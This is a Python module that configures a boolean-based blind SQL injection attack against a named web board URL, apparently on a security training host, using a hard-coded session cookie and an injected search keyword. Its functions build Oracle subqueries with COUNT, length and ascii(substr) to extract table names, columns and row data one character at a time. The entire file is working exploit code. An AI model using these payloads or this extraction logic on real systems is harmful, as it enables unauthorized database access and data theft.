### VAL AREA
targetURL = "http://elms1.skinfosec.co.kr:8082/community6/free"
headers = {"Content-Type": "application/x-www-form-urlencoded"}
cookies = {"JSESSIONID": "3FFEB102DFC9DA3371BAF6689B50E51F"}
data = {
    "startDt": "",
    "endDt": "",
    "searchType": "all",
    "keyword": "aaaa%' and 'a%'='a",
}

targetString = "카카오"

baseQuery = "aaaa%' and {} and 'a%'='a"


def set_cookies(new_cookies):
    global cookies
    cookies["JSESSIONID"] = new_cookies


def get_count(column, table):
    countQuery = (
        "(SELECT COUNT(" + column + ") FROM " + table + ") > "
    )

    return countQuery


def get_count_extend(column, table, condition):
    countQuery = (
        "(SELECT COUNT("
        + column
        + ") FROM "
        + table
        + " WHERE table_name = '"
        + condition
        + "' ) > "
    )

    return countQuery


def get_index(column, table):
    indexQuery = (
        "(SELECT length("
        + column
        + ") FROM (SELECT "
        + column
        + ", rownum as rnum FROM "
        + table
        + ") WHERE rnum = {}) > "
    )

    return indexQuery


def get_index_extend(column, table, condition):
    indexQuery = (
        "(SELECT length("
        + column
        + ") FROM (SELECT "
        + column
        + ", rownum as rnum FROM "
        + table
        + " WHERE table_name = '"
        + condition
        + "') WHERE rnum = {}) > "
    )

    return indexQuery


def get_data(column, table):
    dataQuery = (
        "(SELECT ascii(substr("
        + column
        + ", {}, 1)) FROM (SELECT "
        + column
        + ", rownum as rnum FROM "
        + table
        + ") WHERE rnum = {}) > "
    )

    return dataQuery


def get_data_extend(column, table, condition):
    dataQuery = (
        "(SELECT ascii(substr("
        + column
        + ", {}, 1)) FROM (SELECT "
        + column
        + ", rownum as rnum FROM "
        + table
        + " WHERE table_name = '"
        + condition
        + "') WHERE rnum = {}) > "
    )

    return dataQuery


def get_var(var_name):
    if var_name in globals():
        return globals()[var_name]
    else:
        return None
